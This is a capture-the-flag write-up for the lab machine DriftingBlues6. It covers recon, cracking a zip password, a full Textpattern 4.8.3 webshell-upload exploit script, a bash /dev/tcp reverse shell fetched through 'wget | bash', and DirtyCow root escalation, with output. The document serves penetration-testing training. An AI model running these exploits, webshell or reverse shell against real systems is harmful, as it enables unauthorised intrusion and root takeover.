---
render_with_liquid: false
title: PG Play  DriftingBlues6
date: 2024-06-14 17:50:53 +1400
tags: [pg-play, nmap, linux, feroxbuster, enum, discover-secrets, password-cracking, zip2john, hashcat, textpattern, php, searchsploit, file-upload, kernel-exploit]
---



# Learnt / Summary

- If the machine's kernel is very old `<=4.x` and have `gcc` installed, it's 90% kernel exploit for pirvesc

# Recon


## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Jun 14 17:50:53 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80, 192.168.244.219
Nmap scan report for 192.168.244.219
Host is up, received user-set (0.063s latency).
Scanned at 2024-06-14 17:50:53 CST for 12s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jun 14 17:51:05 2024 -- 1 IP address (1 host up) scanned in 12.64 seconds
```


## 80 - HTTP : driftingblues


### Info

```ruby
http://192.168.244.219 [200] [driftingblues] [Apache/2.2.22 (Debian)] [f4a4752e8cf000ceed434f9ec0b059533b559e46] [Apache HTTP Server:2.2.22,Debian]
```

![](/assets/obsidian/c695a5385d8d5313d25e5e7462d83017.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -t 100 -k -n -u "http://$(pt get rhost):80" -o ferox_80_medium.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ cat ferox_80_medium.txt | grep -vE '^404' | ff
200      GET      212l     1206w    97264c http://192.168.244.219/db
200      GET      212l     1206w    97264c http://192.168.244.219/db.png
200      GET        2l        7w      227c http://192.168.244.219/spammer
200      GET        5l       14w      110c http://192.168.244.219/robots
200      GET       76l       75w      750c http://192.168.244.219/
200      GET       76l       75w      750c http://192.168.244.219/index
301      GET        9l       28w      324c http://192.168.244.219/textpattern => http://192.168.244.219/textpattern/
```

# Initial Access


## Enumeration


### 80

- Got a hint to brute dir with `.zip` (Turns out to be a rabbit hole)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ curl http://192.168.244.219:80/robots.txt
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

- `/textpattern/` - Identified version : `Textpattern CMS 4.8.3`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ curl http://192.168.244.219/textpattern/README.txt
Textpattern CMS 4.8.3
[...]
```

## Shell as x


### 80 - Credential in zip file

- A zip file was returned from `/spammer` endpoint

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ curl http://192.168.244.219/spammer
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ curl http://192.168.244.219/spammer > data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   179  100   179    0     0    785      0 --:--:-- --:--:-- --:--:--   785

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ file data
data: Zip archive data, at least v2.0 to extract, compression method=store
```

- The zip file is encrypted, `creds.txt` is inside it

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ 7z x data -o'80_spammer'
[...]
Enter password (will not be echoed):

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ 7z l data
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-03-16 02:46:21 ....A           15           27  creds.txt
------------------- ----- ------------ ------------  ------------------------
2021-03-16 02:46:21                 15           27  1 files
```

- Cracked the zip file's password

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ zip2john data > data.hash
ver 2.0 data/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ hashcat data.hash /opt/wordlists/rockyou.txt --user -m 17225
[...]

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ hashcat data.hash /opt/wordlists/rockyou.txt --user -m 17225 --show
data/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:myspace4
```

- Got a pair of credentials in `creds.txt`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ 7z x data -o'80_spammer'
[...]
Enter password (will not be echoed):myspace4
Everything is Ok

Size:       15
Compressed: 179

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ cat 80_spammer/creds.txt
mayer:lionheart 
```

### 80 - Textpattern : RCE via Unrestricted File Upload (Authenticated)

> http://192.168.244.219/textpattern/textpattern/index.php

- Login - `mayer`:`lionheart`

![](/assets/obsidian/209a55896008cf9654a7d81d6fb19765.png)

- The credential is valid

![](/assets/obsidian/d72f3f34331c1c0d46fe4f462ca9c389.png)

```bash
searchsploit 'Textpattern CMS 4.8.3'
```

![](/assets/obsidian/0f63c1392229c45508ef0a09609d02f7.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ cd exploit

┌──(bravosec㉿fsociety)-[~/…/pg/play/DriftingBlues6/exploit]
└─$ searchsploit -m 48943.py
  Exploit: TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/48943
     Path: /usr/share/exploitdb/exploits/php/webapps/48943.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/Offsec/pg/play/DriftingBlues6/exploit/48943.py
```

> The exploit had issue grabbing `_txp_token`, below is the modified code that fixed the issue
{: .prompt-info }

![](/assets/obsidian/cc86fef0ef489e4b9e2be17ed66495b0.png)

> `48943.py`

```python

#!/usr/bin/python3


# Exploit Title: TextPattern <= 4.8.3 - Authenticated Remote Code Execution via Unrestricted File Upload

# Google Dork: N/A

# Date: 16/10/2020

# Exploit Author: Michele '0blio_' Cisternino

# Vendor Homepage: https://textpattern.com/

# Software Link: https://github.com/textpattern/textpattern

# Version: <= 4.8.3

# Tested on: Kali Linux x64

# CVE: N/A

import sys
import requests
from bs4 import BeautifulSoup as bs4
from time import sleep
import random
import string
import readline


# Disable SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


# Simple Terminal User Interface class I wrote to print run-time logs and headers
class Tui ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.blue = '\033[94m'
        self.yellow = '\033[93m'
        self.pink = '\033[95m'
        self.end = '\033[0m'
        self.bold = '\033[1m'

    def header (self, software, author, cve='N/A'):
        print ("\n", "{}Software:{} {}".format(self.pink, self.end, software), sep='')
        print ("{}CVE:{} {}".format(self.pink, self.end, cve))
        print ("{}Author:{} {}\n".format(self.pink, self.end, author))

    def info (self, message):
        print ("[{}*{}] {}".format(self.blue, self.end, message))

    def greatInfo (self, message):
        print ("[{}*{}] {}{}{}".format(self.blue, self.end, self.bold, message, self.end))

    def success (self, message):
        print ("[{}✓{}] {}{}{}".format(self.green, self.end, self.bold, message, self.end))

    def warning (self, message):
        print ("[{}!{}] {}".format(self.yellow, self.end, message))

    def error (self, message):
        print ("[{}✗{}] {}".format(self.red, self.end, message))

log = Tui()
log.header (software="TextPattern <= 4.8.3", cve="CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload", author="Michele '0blio_' Cisternino")

if len(sys.argv) < 4:
    log.info ("USAGE: python3 exploit.py http://target.com username password")
    log.info ("EXAMPLE: python3 exploit.py http://localhost admin admin\n")
    sys.exit()


# Get input from the command line
target, username, password = sys.argv[1:4]


# Fixing URL
target = target.strip()
if not target.startswith("https://") and not target.startswith("http://"):
    target = "http://" + target
if not target.endswith("/"):
    target = target + "/"

accessData = {'p_userid':username, 'p_password':password, '_txp_token':""}


# Login
log.info ("Authenticating to the target as '{}'".format(username))
s = requests.Session()
try:
    r = s.post(target + "textpattern/index.php", data=accessData, verify=False)
    sleep(1)
    if r.status_code == 200:
        log.success ("Logged in as '{}' (Cookie: txp_login={}; txp_login_public={})".format(username, s.cookies['txp_login'], s.cookies['txp_login_public']))
        sleep(1)

        # Parsing the response to find the upload token inside the main json array
        log.info ("Grabbing _txp_token (required to proceed with exploitation)..")
        soup = bs4(r.text, 'html.parser')
        scriptJS_list = soup.find_all("script")
        scriptJS = [str(x) for x in scriptJS_list if "var textpattern" in str(x)]
        uploadToken = scriptJS[0].split('_txp_token":"')[1].split('"', 1)[0]
        log.greatInfo ("Upload token grabbed successfully ({})".format(uploadToken))

    # The server reply with a 401 with the user provide wrong creds as input
    elif r.status_code == 401:
        log.error ("Unable to login. You provided wrong credentials..\n")
        sys.exit()
except requests.exceptions.ConnectionError:
    log.error ("Unable to connect to the target!")
    sys.exit()


# Crafting the upload request here
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Accept" : "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
    "Accept-Encoding" : "gzip, deflate",
    "X-Requested-With" : "XMLHttpRequest",
    "Connection" : "close",
}


# Generating random webshell name
randomFilename = ''.join(random.choice(string.ascii_letters) for i in range(10)) + '.php'


# Mapping multiparts here
multipart_form_data = {
    "fileInputOrder" : (None, '1/1'),
    "app_mode" : (None, 'async'),
    "MAX_FILE_SIZE" : (None, '2000000'),
    "event" : (None, 'file'),
    "step" : (None, 'file_insert'),
    "id" : (None, ' '),
    "_txp_token" : (None, uploadToken), # Token here
    "thefile[]" : (randomFilename, '<?php system($_GET["efcd"]); ?>') # lol
}


# Uploading the webshell
log.warning ("Sending payload..")

try:
    r = s.post (target + "textpattern/index.php?event=file", verify=False, headers=headers, files=multipart_form_data)
    if "Files uploaded" in r.text:
        log.success ("Webshell uploaded successfully as {}".format(randomFilename))
except:
    log.error ("Unexpected error..")
    sys.exit()

sleep(2)


# Interact with the webshell (using the readline library to save the history of the executed commands at run-time)
log.greatInfo ("Interacting with the HTTP webshell..")
sleep (1)
print()

while 1:
    try:
        cmd = input ("\033[4m\033[91mwebshell\033[0m > ")
        if cmd == 'exit':
            raise KeyboardInterrupt
        r = requests.get (target + "files/" + randomFilename + "?efcd=" + cmd, verify=False)
        print (r.text)
    except KeyboardInterrupt:
        log.warning ("Stopped.")
        exit()
    except:
        log.error ("Unexpected error..")
        sys.exit()

print()
```

```bash
┌──(bravosec㉿fsociety)-[~/…/pg/play/DriftingBlues6/exploit]
└─$ python 48943.py http://192.168.244.219/textpattern mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2C50a76c0f1b11742721c1d497a4c72683; txp_login_public=63c6bc1e09mayer)
[*] Grabbing _txp_token (required to proceed with exploitation)..
[*] Upload token grabbed successfully (b9f07b369790756e5a43b93656bdca78)
[!] Sending payload..
[✓] Webshell uploaded successfully as ldVnEaxlSk.php
[*] Interacting with the HTTP webshell..

webshell > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get a shell

- Target machine doesn't have `curl` installed, use `wget` instead`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ mkdir -p www && cd www && echo "/bin/bash -c 'bash -i >& /dev/tcp/$(pt get lhost)/1111 0>&1'" > index.html && fuser -k 80/tcp 2>/dev/null; python -m http.server 80
```

```bash
webshell > wget 192.168.45.248 -O - | bash
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/DriftingBlues6]
└─$ rlwrap nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.248] from (UNKNOWN) [192.168.244.219] 55728
bash: no job control in this shell
www-data@driftingblues:/var/www/textpattern/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Privilege Escalation


## From www-data to root


### Kernel exploit - DirtyCow

The kernel version is very old : `3.2.0`

```bash
www-data@driftingblues:/var/www$ uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

And the machine have `gcc` installed

```bash
www-data@driftingblues:/var/www$ gcc
gcc: fatal error: no input files
compilation terminated.
```

- Google : `3.2.0-4-amd64 exploit`

> POC - https://www.exploit-db.com/exploits/40839

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ searchsploit -m 40839
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/www/40839.c
```

> The exploit takes time to run

```bash
www-data@driftingblues:/var/www$ wget http://192.168.45.248/40839.c -O /tmp/40839.c
www-data@driftingblues:/var/www$ cd /tmp
www-data@driftingblues:/tmp$ gcc -pthread 40839.c -o dirty -lcrypt
www-data@driftingblues:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:ficb5pcfN2foU:0:0:pwned:/root:/bin/bash

mmap: 7f9cb4923000
madvise 0


ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'bravosec'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'bravosec'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

```bash
www-data@driftingblues:/tmp$ su - firefart
Password:bravosec
firefart@driftingblues:~# id
uid=0(firefart) gid=0(root) groups=0(root)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/627ada1aebca2d25df7bb90b155debea.png)

# Appendix

